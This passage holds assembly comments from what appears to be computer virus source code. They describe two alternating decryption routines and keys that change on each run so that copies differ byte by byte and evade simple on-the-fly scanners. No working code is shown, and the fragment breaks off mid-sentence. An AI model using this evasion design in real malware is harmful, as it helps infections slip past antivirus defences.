;Decryption routines for the virus. DECRYPT_0 is a dummy for the original

;which decrypt the virus in RAM so that the virus using DECRYPT_1 and
;using DECRYPT_2 looks completely different in a byte-wise comparison.
;The virus dynamically changes the numbers used to decrypt each time it is
;run. Although not real sophisticated, these get the job done and fool
;real rudimentary on-the-fly scanners. The virus selects one of these two
